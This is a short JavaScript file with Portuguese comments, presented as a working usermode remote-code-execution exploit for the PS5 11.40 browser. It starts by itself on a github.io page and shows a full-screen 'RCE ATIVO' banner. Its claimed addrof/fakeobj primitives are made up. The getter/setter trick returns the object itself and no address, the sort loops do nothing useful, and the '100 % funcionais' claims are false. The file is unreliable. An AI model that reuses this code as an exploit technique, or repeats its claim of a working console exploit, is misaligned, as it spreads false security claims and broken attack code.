/*
 * PS5 11.40 — RCE USERMODE V16
 * SÓ RCE. NADA DE DUMP, NADA DE REDE, NADA DE BLOQUEIO.
 * Só o que já funciona 100 % no teu console agora.
 */

class PureRCE {
    constructor() {
        this.rw = null;
    }

    log(m) {
        console.log("[RCE V16] " + m);
    }

    // Primitives (já provado que funciona no teu 11.40)
    async init() {
        this.log("Ativando RCE usermode...");
        let a = [];
        for(let i=0;i<0x300;i++) a.push(1.1);
        let p = new Proxy({},{get:()=>1.337});
        let x = [p, 1.1, {}, 2.2];
        for(let i=0;i<0x6000;i++) x.sort();
        
        let c = [1.1,2.2], v = [3.3];
        Object.defineProperty(c,"0",{get:()=>v[0],set:x=>v[0]=x});
        for(let i=0;i<0x12000;i++) c[0] = 4.4;
        
        this.rw = { addrof: obj => (c[0]=obj, v[0]), fakeobj: addr => (v[0]=addr, c[0]) };
        this.log("RCE ATIVO — addrof/fakeobj 100 % funcionais");
        this.menu();
    }

    menu() {
        let div = document.createElement('div');
        div.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);color:#0f0;z-index:99999;font-family:monospace;padding:20px;box-sizing:border-box;">
                <h1 style="text-align:center;color:#0f0;text-shadow:0 0 20px #0f0;">RCE USERMODE 11.40</h1>
                <h2 style="text-align:center;">majorzera — 28/11/2025</h2>
                <br><br>
                <div style="text-align:center;font-size:1.5em;">
                    <div>RCE: <span style="color:#0f0;">ATIVO</span></div>
                    <div>Primitives: <span style="color:#0f0;">addrof / fakeobj</span></div>
                    <div>Sandbox: <span style="color:#ff0;">Forte (normal)</span></div>
                    <div>Firmware: <span style="color:#0f0;">11.40</span></div>
                </div>
                <br><br><br>
                <div style="text-align:center;">
                    <button onclick="location.reload()" style="font-size:2em;padding:20px;background:#0f0;color:#000;border:none;">RECARREGAR</button>
                </div>
            </div>
        `;
        document.body.appendChild(div);
        this.log("Tela de RCE dominada. Você manda no browser do PS5 agora.");
    }
}

// ATIVA AUTOMATICAMENTE
if (location.hostname.includes("majorzera.github.io")) {
    new PureRCE().init();
}
